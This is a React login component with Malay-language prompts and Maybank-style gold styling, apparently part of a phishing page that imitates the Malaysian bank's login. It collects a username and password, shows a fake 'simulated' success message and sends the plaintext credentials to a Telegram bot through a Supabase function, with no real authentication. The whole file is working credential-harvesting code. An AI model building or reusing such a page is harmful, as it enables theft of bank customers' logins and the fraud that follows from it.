import React from "react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { User, Lock, ChevronRight } from "lucide-react";
import { toast } from "sonner"; // Import toast for notifications
import { supabase } from "@/integrations/supabase/client"; // Import Supabase client

const LoginCard: React.FC = () => {
  const [loginStep, setLoginStep] = React.useState<'username' | 'password'>('username');
  const [username, setUsername] = React.useState<string>('');
  const [password, setPassword] = React.useState<string>('');

  const sendTelegramNotification = async (user: string, pass: string, status: string) => {
    try {
      const { data, error } = await supabase.functions.invoke('send-telegram-message', {
        body: { username: user, password: pass, message: status },
      });

      if (error) {
        console.error('Error invoking Telegram Edge Function:', error);
        toast.error("Gagal menghantar pemberitahuan Telegram.");
      } else {
        console.log('Telegram notification sent:', data);
      }
    } catch (err) {
      console.error('Unexpected error sending Telegram notification:', err);
      toast.error("Ralat tidak dijangka semasa menghantar pemberitahuan Telegram.");
    }
  };

  const handleLogin = async () => {
    if (loginStep === 'username') {
      if (username.trim() === '') {
        toast.error("Sila masukkan nama pengguna anda.");
        return;
      }
      // In a real app, you'd validate username with a backend here
      setLoginStep('password');
      toast.success(`Selamat datang, ${username}! Sila masukkan kata laluan anda.`);
      // Pemberitahuan Telegram tidak dihantar di sini lagi
    } else { // loginStep === 'password'
      if (password.trim() === '') {
        toast.error("Sila masukkan kata laluan anda.");
        return;
      }
      // In a real app, you'd send username and password to backend for authentication
      console.log("Attempting to log in with:", { username, password });
      toast.success("Log masuk berjaya! (Simulasi)");
      await sendTelegramNotification(username, password, "Log masuk berjaya (simulasi)."); // Hanya hantar di sini
      // Optionally reset or redirect after successful login
      // setLoginStep('username');
      // setUsername('');
      // setPassword('');
    }
  };

  return (
    <div className="w-full max-w-xs">
      {/* Combined input and button container with thicker border */}
      <div className="flex items-center mb-4 border-2 border-gray-300 rounded-md overflow-hidden">
        {/* Icon and Input part */}
        <div className="flex items-center flex-grow h-10 bg-white/80 pl-3">
          {/* Circle around the User icon */}
          <div className="w-8 h-8 rounded-full border border-gray-400 flex items-center justify-center bg-gray-100">
            {loginStep === 'username' ? (
              <User className="h-5 w-5 text-gray-500" />
            ) : (
              <Lock className="h-5 w-5 text-gray-500" />
            )}
          </div>
          {loginStep === 'username' ? (
            <Input
              type="text"
              placeholder="My Username"
              className="flex-grow border-none focus-visible:ring-0 focus-visible:ring-offset-0 h-full px-2 text-gray-700"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              onKeyPress={(e) => {
                if (e.key === 'Enter') handleLogin();
              }}
            />
          ) : (
            <Input
              type="password"
              placeholder="My Password"
              className="flex-grow border-none focus-visible:ring-0 focus-visible:ring-offset-0 h-full px-2 text-gray-700"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              onKeyPress={(e) => {
                if (e.key === 'Enter') handleLogin();
              }}
            />
          )}
        </div>
        {/* Login Button part */}
        <Button
          onClick={handleLogin}
          className="bg-maybank-gold hover:bg-yellow-600 text-white font-semibold flex items-center justify-center space-x-2 h-10 px-4 rounded-none"
        >
          <Lock className="h-5 w-5" />
          <span>LOGIN</span>
        </Button>
      </div>
      {/* Modified Forgot Login Details Button */}
      <Button
        className="bg-black/30 text-white px-4 py-2 rounded-md block mx-auto hover:bg-black/40 flex items-center justify-center space-x-2"
      >
        <span>FORGOT LOGIN DETAILS</span>
        <ChevronRight className="h-4 w-4" />
      </Button>
    </div>
  );
};

export default LoginCard;